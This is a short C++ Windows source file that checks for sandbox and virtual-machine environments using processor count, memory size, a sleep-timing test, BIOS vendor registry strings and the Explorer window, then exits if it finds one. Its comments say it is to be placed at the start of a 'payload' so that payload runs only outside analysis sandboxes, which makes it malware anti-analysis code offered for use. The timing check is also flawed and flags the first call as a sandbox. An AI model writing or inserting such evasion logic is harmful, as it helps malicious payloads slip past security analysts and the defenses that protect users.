#include <windows.h>
#include <iostream>
#include <vector>
#include <string>

// Function to detect sandbox based on various indicators
bool IsRunningInSandbox() {
    // Check 1: Number of CPUs (sandboxes often simulate few cores)
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) {
        return true;
    }

    // Check 2: Total memory (sandboxes limit RAM)
    MEMORYSTATUSEX ms = { sizeof(ms) };
    GlobalMemoryStatusEx(&ms);
    if (ms.ullTotalPhys < 2LL * 1024 * 1024 * 1024) { // Less than 2 GB
        return true;
    }

    // Check 3: Execution time (sandboxes run payloads for limited time)
    static DWORD startTime = GetTickCount();
    if (GetTickCount() - startTime > 30000) { // More than 30 seconds
        // Not sandbox if run this long
    } else {
        Sleep(1000); // Sleep to simulate activity
        if (GetTickCount() - startTime < 500) { // If time doesn't advance, it's accelerated (sandbox)
            return true;
        }
    }

    // Check 4: Virtual hardware (basic VM detection)
    // Look for common VM devices
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\BIOS", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char biosVendor[256];
        DWORD size = sizeof(biosVendor);
        if (RegQueryValueExA(hKey, "BIOSVendor", NULL, NULL, (LPBYTE)biosVendor, &size) == ERROR_SUCCESS) {
            std::string vendor(biosVendor);
            if (vendor.find("VMware") != std::string::npos || vendor.find("VirtualBox") != std::string::npos) {
                RegCloseKey(hKey);
                return true; // Is VM, but could be intentional lab; adjust as needed
            }
        }
        RegCloseKey(hKey);
    }

    // Check 5: Missing common processes (e.g., explorer.exe on desktop)
    if (!FindWindowA(NULL, "Program Manager")) { // Explorer window
        return true;
    }

    return false;
}

// Function to abort if in sandbox
void CheckAndAbortIfSandbox() {
    if (IsRunningInSandbox()) {
        std::cout << "Sandbox environment detected. Aborting." << std::endl;
        ExitProcess(0);
    }
}

// Integrate into payload: Call at start
int main() {
    CheckAndAbortIfSandbox();
    // Continue with normal payload
    std::cout << "Not sandbox. Executing payload." << std::endl;
    // ... payload code
    return 0;
}